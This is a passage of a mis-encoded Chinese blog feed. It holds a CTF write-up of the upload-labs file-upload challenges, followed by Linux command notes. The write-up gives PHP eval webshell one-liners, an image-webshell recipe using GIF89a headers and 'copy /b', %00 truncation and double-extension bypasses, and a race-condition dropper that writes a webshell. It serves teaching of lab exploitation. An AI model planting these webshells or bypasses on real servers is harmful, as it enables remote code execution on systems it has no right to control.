title="PASS-11"></a>PASS-11</h1><p>åŒå†™ç»•è¿‡</p><pre><code> $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></pre><p>é»‘åå•è¿‡æ»¤ï¼Œå°†é»‘åå•é‡Œçš„åç¼€åæ›¿æ¢ä¸ºç©ºä¸”åªæ›¿æ¢ä¸€æ¬¡ï¼Œå› æ­¤å¯ä»¥ç”¨åŒå†™ç»•è¿‡</p><p><a href="https://www.w3school.com.cn/php/func_string_str_ireplace.asp" target="_blank" rel="noopener">PHP str_ireplace() å‡½æ•°</a></p><p>å°†$file_nameä¸­çš„$deny_extéƒ½æ›¿æ¢ä¸ºç©º</p><h1 id="Pass-12-00æˆªæ–­"><a href="#Pass-12-00æˆªæ–­" class="headerlink" title="Pass-12-00æˆªæ–­"></a>Pass-12-00æˆªæ–­</h1><p>hintï¼šæœ¬passä¸Šä¼ è·¯å¾„å¯æ§ï¼</p><p>ä¹Ÿå°±æ˜¯ç™½åå•è¿‡æ»¤</p><p>çœ‹æºç ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>%00æ˜¯chr(O)ï¼Œå®ƒä¸æ˜¯ç©ºæ ¼ï¼Œæ˜¯NULLï¼Œç©ºå­—ç¬¦ã€‚</li><li>å½“ç¨‹åºåœ¨è¾“å‡ºå«æœ‰chr(O)å˜é‡æ—¶ï¼Œchr(O)åé¢çš„æ•°æ®ä¼šè¢«åœæ­¢ï¼Œæ¢å¥è¯è¯´ï¼Œå°±æ˜¯è¯¯æŠŠå®ƒå½“åšç»“æŸç¬¦ï¼Œåé¢çš„æ•°æ®ç›´æ¥å¿½ç•¥ï¼Œè¿™å°±å¯¼è‡´æ¼æ´äº§ç”Ÿçš„åŸå› ã€‚</li><li>åœ¨æ–‡ä»¶ä¸Šä¼ ä¸­ï¼Œåˆ©ç”¨%00æˆªæ–­ï¼Œåœ¨æ–‡ä»¶æ‰©å±•åéªŒè¯æ—¶ï¼Œæ˜¯å–æ–‡ä»¶çš„æ‰©å±•åæ¥åšéªŒè¯ï¼Œä½†æ˜¯æœ€åæ–‡ä»¶ä¿å­˜åœ¨æœ¬åœ°æ—¶ï¼Œ<code>%00ä¼šæˆªæ–­æ–‡ä»¶åï¼Œåªä¿å­˜%00ä¹‹å‰çš„å†…å®¹</code>Â·ã€‚</li><li>å‰ææ¡ä»¶ï¼š PHPç‰ˆæœ¬ &lt; 5.3.4 ã€phpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2019061908535953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™æ ·å…¶æ–‡ä»¶åå­—åé¢è·Ÿçš„éšæœºæ•°å°±ä¼šè¢«æˆªæ–­ï¼Œä¿è¯ä¹‹è¿”å›è‡ªå·±æ‰€è®¾å®šçš„æ–‡ä»¶å</p><h1 id="Pass-13-00æˆªæ–­"><a href="#Pass-13-00æˆªæ–­" class="headerlink" title="Pass-13-00æˆªæ–­"></a>Pass-13-00æˆªæ–­</h1><p>postè¿›è¡Œæˆªæ–­</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2019061909071992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>POSTä¸ä¼šåƒGETé‚£æ ·å¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ï¼Œæ‰€ä»¥éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹  ï¼Œå°†hexæ”¹ä¸º00</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2019061909081330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><h3 id="è€ƒå¯Ÿç‚¹-å›¾ç‰‡é©¬ä¸Šä¼ "><a href="#è€ƒå¯Ÿç‚¹-å›¾ç‰‡é©¬ä¸Šä¼ " class="headerlink" title="è€ƒå¯Ÿç‚¹  å›¾ç‰‡é©¬ä¸Šä¼ "></a>è€ƒå¯Ÿç‚¹  å›¾ç‰‡é©¬ä¸Šä¼ </h3><p>å¯ä»¥å°†å›¾ç‰‡å¸¦å…¥åˆ°PHPä»£ç é‡Œï¼Œä»è€Œå¯¼è‡´PHPä»£ç æ‰§è¡Œ</p><h3 id="å›¾ç‰‡é©¬åˆ¶ä½œ"><a href="#å›¾ç‰‡é©¬åˆ¶ä½œ" class="headerlink" title="å›¾ç‰‡é©¬åˆ¶ä½œ"></a>å›¾ç‰‡é©¬åˆ¶ä½œ</h3><p>GIFçš„æ–‡ä»¶å¤´GIF89a ,ZIPå‹ç¼©æ–‡ä»¶æ–‡ä»¶å¤´PK   ,7zå‹ç¼©æ–‡ä»¶æ–‡ä»¶å¤´7z</p><pre><code>æ³•1.åˆ›å»ºä¸€ä¸ªç©ºçš„.phpæ–‡ä»¶ï¼Œç”¨notepad++å†™å…¥GIF89a  &lt;?php @eval($_POST[value]);?&gt;æ³•2.gifåç¼€æ–‡ä»¶,ç”¨notepad++å†™å…¥ä¸€å¥è¯æœ¨é©¬</code></pre><p>æŠŠåˆ¶ä½œå¥½çš„å›¾ç‰‡é©¬ä¸Šä¼ ï¼Œæ‰“å¼€<code>æ–‡ä»¶åŒ…å«æ¼æ´</code>å‘é€GETè¯·æ±‚<code>ï¼Ÿfile=upload/å›¾ç‰‡æ–‡ä»¶å</code>ï¼Œèšå‰‘è¿æ¥å³å¯</p><p>éœ€è¦å¼€å¯fileè¯»å–æƒé™</p><h3 id="åˆ¶æ³•äºŒï¼š"><a href="#åˆ¶æ³•äºŒï¼š" class="headerlink" title="åˆ¶æ³•äºŒï¼š"></a>åˆ¶æ³•äºŒï¼š</h3><ol><li>åœ¨è·¯å¾„ä¸‹å‡†å¤‡å¥½ä¸€å¥è¯æœ¨é©¬.phpå’Œä¸€å¼ å›¾ç‰‡ .png (æˆ–è€… .jpg )</li><li>è¾“å…¥ç³»ç»ŸæŒ‡ä»¤ï¼š <code>copy ä¸€å¼ å›¾ç‰‡.png/b+ä¸€å¥è¯æœ¨é©¬.php/a ç”Ÿæˆå›¾ç‰‡åç§°.png</code></li><li>è¿™æ ·å›¾ç‰‡æœ¨é©¬å°±åˆæˆå¥½äº†</li></ol><h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><p>è¿™é¢˜æ˜¯ç”¨getimagesizeå‡½æ•°åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œè¿˜æ˜¯å¯ä»¥å›¾ç‰‡é©¬ç»•è¿‡ï¼Œæ–¹æ³•åŒpass-14</p><h1 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h1><p>è¿™é‡Œç”¨åˆ°php_exifæ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œç”¨å›¾ç‰‡é©¬ç»•è¿‡ï¼Œæ–¹æ³•åŒpass-15</p><h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a><a href="https://xz.aliyun.com/t/2657#toc-13" target="_blank" rel="noopener">Pass-17</a></h1><p>æœ‰å¾…æ·±ç©¶</p><h1 id="Pass-18-æ¡ä»¶ç«äº‰"><a href="#Pass-18-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass-18-æ¡ä»¶ç«äº‰"></a>Pass-18-æ¡ä»¶ç«äº‰</h1><p>æ‰€è°“æ¡ä»¶ç«äº‰ï¼Œå°±æ˜¯åˆ©ç”¨â€¦..</p><p> åŸå› ï¼šåç«¯æ–‡ä»¶æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„åŠ é”è®¾ç½®ï¼Œå¯¼è‡´å¯ä»¥å¤šç”¨æˆ·åŒæ—¶è®¿é—®ä¸€ä¸ªæ–‡ä»¶</p><p>åŸç†ï¼šphpæœ¨é©¬æ–‡ä»¶ä¸Šä¼ åç«¯åï¼Œæ ¹æ®ç­–ç•¥å¯¹æ–‡ä»¶å®¡æŸ¥ï¼Œå®¡æŸ¥ä¸ºphpæ–‡ä»¶åˆ™è¿›è¡Œç§»é™¤ï¼Œè€Œå½“å…¶å®¡æŸ¥ä¹‹æ—¶æˆ‘ä»¬è®¿é—®phpæœ¨é©¬ï¼Œé€ æˆæ–‡ä»¶ç«äº‰ï¼Œè¿›è€Œphpæ–‡ä»¶æ‰§è¡Œè‡ªèº«ä»£ç ï¼Œåˆ›å»ºå…¶ä¸­å‘½ä»¤</p><p> æœ¨é©¬æ–‡ä»¶ï¼ˆjingzheng.phpï¼‰ï¼š</p><p> <code>&lt;?php $a = &#39;&lt;?php @eval($_POST[\&#39;a\&#39;])?&gt;&#39;;file_put_contents(&#39;1.php&#39;,$a)?&gt;</code></p><p><a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html" target="_blank" rel="noopener">PHP file_put_contents() å‡½æ•°</a></p><p><a href="https://blog.csdn.net/qq_35350265/article/details/113337635" target="_blank" rel="noopener">æ“ä½œç»†èŠ‚</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxç¬”è®°</title>
      <link href="/2021/01/15/linux-da-xue-xi/"/>
      <url>/2021/01/15/linux-da-xue-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1811084968&auto=1&height=66"></iframe><h1 id="Linuxå‘½ä»¤å¤ä¹ ï¼š"><a href="#Linuxå‘½ä»¤å¤ä¹ ï¼š" class="headerlink" title="Linuxå‘½ä»¤å¤ä¹ ï¼š"></a>Linuxå‘½ä»¤å¤ä¹ ï¼š</h1><p>mkdir (file)ï¼šåˆ›å»ºä¸€ä¸ªæ–‡æœ¬å¤¹</p><p>touch åˆ›å»ºtxtæ–‡ä»¶</p><p>dirï¼šæŸ¥çœ‹å½“å‰çš„ç›®å½•</p><p>ls -laï¼šæŸ¥çœ‹å½“å‰æ–‡ä»¶å¹¶æ›´å¤šä¿¡æ¯ï¼ˆå¦‚ï¼šæ–‡ä»¶æ‰€è¢«ç»™äºˆçš„æƒé™ï¼‰</p><p>rm <file>ï¼š-rfå¼ºè¡Œåˆ é™¤æ–‡ä»¶</file></p><p>rmdirï¼ˆè‹±æ–‡å…¨æ‹¼ï¼šremove directoryï¼‰ï¼šåˆ é™¤ä¸€ä¸ªç©ºçš„ç›®å½•</p><p><a href="https://www.runoob.com/linux/linux-comm-ping.html" target="_blank" rel="noopener">pingå‘½ä»¤</a></p><h1 id="linuxè¿ç»´åŸºç¡€"><a href="#linuxè¿ç»´åŸºç¡€" class="headerlink" title="linuxè¿ç»´åŸºç¡€"></a>linuxè¿ç»´åŸºç¡€</h1><h2 id="ç£ç›˜æ–‡ä»¶ç®¡ç†"><a href="#ç£ç›˜æ–‡ä»¶ç®¡ç†" class="headerlink" title="ç£ç›˜æ–‡ä»¶ç®¡ç†"></a>ç£ç›˜æ–‡ä»¶ç®¡ç†</h2><p><strong>whereis pythonæŸ¥æ‰¾æŒ‡å®šå‘½ä»¤æ–‡ä»¶æ‰€å­˜åœ¨çš„ä½ç½®</strong></p><p><strong>clearæ¸…å±</strong></p><p><strong>rmdiråˆ é™¤æ–‡ä»¶å¤¹</strong></p><p><strong>mv å‰ªåˆ‡ç§»åŠ¨æ–‡ä»¶ -fç§»åŠ¨æ–‡ä»¶å¤¹</strong></p><p><strong>tarï¼šé‡åœ¨æ‰“åŒ…</strong></p><p>cå‹ç¼©æ‰“åŒ…</p><p>vå›æ˜¾æ‰“åŒ…ä¿¡æ¯</p><p>fæŒ‰ç…§æ–‡ä»¶æ“ä½œæ–¹å¼è¿›è¡Œæ“ä½œ</p><p><strong>gzipï¼šè§£å‹å‹ç¼©</strong></p><p>-rå‹ç¼©æŒ‡å®šè¯¥æ–‡ä»¶ï¼ŒåŒ…å«æ–‡ä»¶å¤¹</p><p>-dè§£å‹ç¼©æŒ‡å®šæ–‡ä»¶</p><p>å¯ä»¥é€šè¿‡ls -lhæ¥è§‚å¯Ÿå¤§å°</p><p><strong>bzip</strong></p><p><strong>zipä¸unzip</strong></p><p><strong>grepï¼š</strong></p><p><code>grep &#39;root&#39; /etc/passwd</code></p><p>-i å¿½ç•¥å¤§å°å†™</p><p><code>grep -i &#39;Root&#39; /etc/passwd</code></p><p>ä¸ä¸Šä¸€å‘½ä»¤è¿”å›ç»“æœç›¸åŒ</p><p>-v åªæ‰“å°æ²¡æœ‰åŒ¹é…åˆ°çš„ï¼š</p><p><code>grep -v &#39;root&#39; /etc/passwd</code></p><p>æ‰“å°é™¤äº†rootä»¥å¤–çš„æ‰€æœ‰</p><p>-n æ˜¾ç¤ºè¡Œæ•°</p><p>â€“color å°†åŒ¹é…åˆ°çš„é«˜äº®æ˜¾ç¤º</p><p><strong>sedï¼š</strong>åˆ©ç”¨è„šæœ¬å¤„ç†æ–‡ä»¶</p><p>-nå–æ¶ˆå®Œæ•´é»˜è®¤è¾“å‡ºï¼Œåªæ‰“å°æˆ‘ä»¬éœ€è¦çš„ï¼š</p><p><code>sed -n &#39;1,3p&#39; 1.txt</code>ï¼Œæ‰“å°1.txtä¸­çš„ç¬¬ä¸€åˆ°ä¸‰è¡Œ</p><p>-ræ­£åˆ™åŒ¹é…ï¼ˆå¤ªè¿‡å¤æ‚ï¼Œè®²å¾—ä¸å¥½ï¼‰ï¼š</p><p><code>ifconfig | grep &quot;inet&quot; | sed &#39;s/^.*åœ°å€://g&#39;</code>æŸ¥æ‰¾ifconfigä¸­æœ‰inetçš„è¡Œå¹¶ä¸”å°†<strong>åœ°å€ï¼šä¹‹å‰çš„</strong>æ›¿æ¢ä¸ºç©º</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210811171344877.png" alt></p><p><strong>awkï¼š</strong>æ–‡æœ¬åˆ†æå·¥å…·</p><p><strong>netstatï¼š</strong>æ˜¾ç¤ºç‹—å„¿ä¸­ç½‘ç»œç›¸å…³ä¿¡æ¯</p><p>-aåˆ—å‡ºæ‰€æœ‰ç«¯å£</p><p>-atæ‰€æœ‰tcpç«¯å£</p><p>-auæ‰€æœ‰udpç«¯å£</p><p>-låªæ˜¾ç¤ºç›‘å¬ç«¯å£</p><p>-sæ˜¾ç¤ºæ‰€æœ‰ç«¯å£çš„ç»Ÿè®¡ä¿¡æ¯</p><p>-ptæ˜¾ç¤ºpidå’Œè¿›ç¨‹å‘½ä»¤</p><p><strong>killï¼š</strong>åˆ é™¤æ‰§è¡Œä¸­çš„ç¨‹åºæˆ–å·¥ä½œ</p><p>kill -9 pidé€šè¿‡éå¸¸æ‰‹æ®µç›´æ¥ç»ˆç»“æ‰è¿›ç¨‹ï¼Œä¾‹å¦‚æœ¨é©¬ç¨‹åº</p><p><strong>historyï¼š</strong>æŸ¥çœ‹åœ¨æ“ä½œç³»ç»Ÿä¸ªä¸­ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤</p><h2 id="ç”¨æˆ·æƒé™ç®¡ç†"><a href="#ç”¨æˆ·æƒé™ç®¡ç†" class="headerlink" title="ç”¨æˆ·æƒé™ç®¡ç†"></a>ç”¨æˆ·æƒé™ç®¡ç†</h2><p><strong>whoami</strong></p><p><strong>useraddï¼š</strong></p><p>-m yn8rtåˆ›å»ºç”¨æˆ·</p><p>ç„¶ååœ¨homeä¸‹é¢æ‰¾åˆ°è¯¥ç”¨æˆ·cdè¿›å»ï¼Œpasswdåˆ›å»ºç”¨æˆ·</p><p><strong>userdelï¼š</strong></p><p>-r yn8rtåˆ é™¤è¯¥ç”¨æˆ·</p><h2 id="è¿›ç¨‹åˆ†æ"><a href="#è¿›ç¨‹åˆ†æ" class="headerlink" title="è¿›ç¨‹åˆ†æ"></a>è¿›ç¨‹åˆ†æ</h2><p><strong>topï¼š</strong></p><p>-pé€šè¿‡åˆ¶å®šç›‘æ§è¿›ç¨‹IDæ¥ä»…ä»…ç›‘æ§æŸä¸ªè¿›ç¨‹çš„çŠ¶æ€</p><p>-qä½¿topæ²¡æœ‰ä»»ä½•å»¶è¿Ÿçš„åˆ·æ–°</p><p>-då±å¹•åˆ·æ–°æ—¶é—´</p><h2 id="Linuxå¸¸è§æ–‡ä»¶åŠç›®å½•çš„ç”¨é€”"><a href="#Linuxå¸¸è§æ–‡ä»¶åŠç›®å½•çš„ç”¨é€”" class="headerlink" title="Linuxå¸¸è§æ–‡ä»¶åŠç›®å½•çš„ç”¨é€”"></a>Linuxå¸¸è§æ–‡ä»¶åŠç›®å½•çš„ç”¨é€”</h2><p>Linuxå¸¸ç”¨ç›®å½•çš„ä½œç”¨ï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">/</span> æ ¹ç›®å½•<span class="token operator">/</span>bin å‘½ä»¤ä¿å­˜ç›®å½•ï¼ˆæ™®é€šç”¨æˆ·æƒé™ï¼‰<span class="token operator">/</span>sbin å‘½ä»¤ä¿å­˜ç›®å½•ï¼ˆrootæƒé™ï¼‰<span class="token operator">/</span>boot å¯åŠ¨ç›®å½•ï¼ŒåŒ…å«å¯åŠ¨ç›¸å…³æ–‡ä»¶ï¼Œå’Œå¼€æœºæœ‰å…³<span class="token operator">/</span>dev è®¾å¤‡æ–‡ä»¶ä¿å­˜ç›®å½•<span class="token operator">/</span>etc é…ç½®æ–‡ä»¶ä¿å­˜ç›®å½•<span class="token operator">/</span>home æ™®é€šç”¨æˆ·å®¶ç›®å½•<span class="token operator">/</span>lib ç³»ç»Ÿåº“ä¿å­˜ç›®å½•<span class="token operator">/</span>mnt ç³»ç»ŸæŒ‚è½½ç›®å½•<span class="token operator">/</span>media æŒ‚è½½ç›®å½•ï¼ˆå¸¸ç”¨äºå…‰ç›˜æŒ‚è½½ï¼‰<span class="token operator">/</span>root è¶…çº§ç”¨æˆ·å®¶ç›®å½•<span class="token operator">/</span>tmp ä¸´æ—¶ç›®å½•<span class="token operator">/</span>proc ç›´æ¥å†™å…¥å†…å­˜çš„<span class="token operator">/</span>sys ç›´æ¥å†™å…¥å†…å­˜çš„<span class="token operator">/</span>usr ç³»ç»Ÿè½¯ä»¶èµ„æºç›®å½•<span class="token operator">/</span>var ç³»ç»Ÿç›¸å…³æ–‡æ¡£å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æœ‰ä¸”åªæœ‰ä¸€ä¸ª"><a href="#æœ‰ä¸”åªæœ‰ä¸€ä¸ª" class="headerlink" title="/(æœ‰ä¸”åªæœ‰ä¸€ä¸ª)"></a>/(æœ‰ä¸”åªæœ‰ä¸€ä¸ª)</h3><p>æ ¹ç›®å½•ã€‚<br>åŒ…å«äº†å‡ ä¹æ‰€çš„æ–‡ä»¶ç›®å½•ã€‚ç›¸å½“äºä¸­å¤®ç³»ç»Ÿã€‚è¿›å…¥çš„æœ€ç®€å•æ–¹æ³•æ˜¯ï¼šcd /ã€‚</p><h3 id="boot"><a href="#boot" class="headerlink" title="/boot"></a>/boot</h3><p>å¼•å¯¼ç¨‹åºï¼Œå†…æ ¸ç­‰å­˜æ”¾çš„ç›®å½•ã€‚<br>è¿™ä¸ªç›®å½•ï¼ŒåŒ…æ‹¬äº†åœ¨å¼•å¯¼è¿‡ç¨‹ä¸­æ‰€å¿…éœ€çš„æ–‡ä»¶ï¼Œå¼•å¯¼ç¨‹åºçš„ç›¸å…³æ–‡ä»¶ï¼ˆä¾‹å¦‚grubï¼Œliloä»¥åŠç›¸åº”çš„é…ç½®æ–‡ä»¶ä»¥åŠLinuxæ“ä½œç³»ç»Ÿå†…æ ¸ç›¸å…³æ–‡ä»¶ï¼ˆä¾‹å¦‚vmlinuzç­‰ä¸€èˆ¬éƒ½å­˜æ”¾åœ¨è¿™é‡Œã€‚åœ¨æœ€å¼€å§‹çš„å¯åŠ¨é˜¶æ®µï¼Œé€šè¿‡å¼•å¯¼ç¨‹åºå°†å†…æ ¸åŠ è½½åˆ°å†…å­˜ï¼Œå®Œæˆå†…æ ¸çš„å¯åŠ¨ï¼ˆè¿™ä¸ªæ—¶å€™ï¼Œè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿè¿˜ä¸å­˜åœ¨ï¼ŒåŠ è½½çš„å†…æ ¸è™½ç„¶æ˜¯ä»ç¡¬ç›˜è¯»å–çš„ï¼Œä½†æ˜¯æ²¡ç»è¿‡Linuxçš„è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œè¿™æ˜¯æ¯”è¾ƒåº•å±‚çš„ä¸œè¥¿æ¥å®ç°çš„ã€‚ç„¶åå†…æ ¸è‡ªå·±åˆ›å»ºå¥½è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”ä»è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿçš„å…¶ä»–å­ç›®å½•ä¸­ï¼ˆä¾‹å¦‚/sbin å’Œ /etcåŠ è½½éœ€è¦åœ¨å¼€æœºå¯åŠ¨çš„å…¶ä»–ç¨‹åºæˆ–è€…æœåŠ¡æˆ–è€…ç‰¹å®šçš„åŠ¨ä½œï¼ˆéƒ¨åˆ†å¯ä»¥ç”±ç”¨æˆ·è‡ªå·±åœ¨ç›¸åº”çš„ç›®å½•ä¸­ä¿®æ”¹ç›¸åº”çš„æ–‡ä»¶æ¥é…åˆ¶ã€‚å¦‚æœæˆ‘ä»¬çš„æœºå™¨ä¸­åŒ…å«å¤šä¸ªæ“ä½œç³»ç»Ÿï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡ä¿®æ”¹è¿™ä¸ªç›®å½•ä¸­çš„æŸä¸ªé…ç½®æ–‡ä»¶ï¼ˆä¾‹å¦‚grub.confæ¥è°ƒæ•´å¯åŠ¨çš„é»˜è®¤æ“ä½œç³»ç»Ÿï¼Œç³»ç»Ÿå¯åŠ¨çš„æ‹©èœå•ï¼Œä»¥åŠå¯åŠ¨å»¶è¿Ÿç­‰å‚æ•°ã€‚</p><h3 id="sbin"><a href="#sbin" class="headerlink" title="/sbin"></a>/sbin</h3><p>è¶…çº§ç”¨æˆ·å¯ä»¥ä½¿ç”¨çš„å‘½ä»¤çš„å­˜æ”¾ç›®å½•ã€‚<br>å­˜æ”¾å¤§å¤šæ¶‰åŠç³»ç»Ÿç®¡ç†çš„å‘½ä»¤æˆ‘ä»¬è¦è®°ä½ï¼Œå‡¡æ˜¯ç›®å½•sbinä¸­åŒ…å«çš„éƒ½æ˜¯rootæƒé™æ‰èƒ½æ‰§è¡Œçš„ã€‚</p><h3 id="bin"><a href="#bin" class="headerlink" title="/bin"></a>/bin</h3><p>æ™®é€šç”¨æˆ·å¯ä»¥ä½¿ç”¨çš„å‘½ä»¤çš„å­˜æ”¾ç›®å½•ã€‚<br>ç³»ç»Ÿæ‰€éœ€è¦çš„é‚£äº›å‘½ä»¤ä½äºæ­¤ç›®å½•ï¼Œæ¯”å¦‚lsã€cpã€mkdirç­‰å‘½ä»¤ï¼›ç±»ä¼¼çš„ç›®å½•è¿˜/usr/binï¼Œ/usr/local/binç­‰ç­‰ã€‚è¿™ä¸ªç›®å½•ä¸­çš„æ–‡ä»¶éƒ½æ˜¯å¯æ‰§è¡Œçš„ã€æ™®é€šç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨çš„å‘½ä»¤ã€‚ä½œä¸ºåŸºç¡€ç³»ç»Ÿæ‰€éœ€è¦çš„æœ€åŸºç¡€çš„å‘½ä»¤å°±æ˜¯æ”¾åœ¨è¿™é‡Œã€‚</p><h3 id="lib"><a href="#lib" class="headerlink" title="/lib"></a>/lib</h3><p>æ ¹ç›®å½•ä¸‹çš„æ‰€ç¨‹åºçš„å…±äº«åº“ç›®å½•ã€‚<br>æ­¤ç›®å½•ä¸‹åŒ…å«ç³»ç»Ÿå¼•å¯¼å’Œåœ¨æ 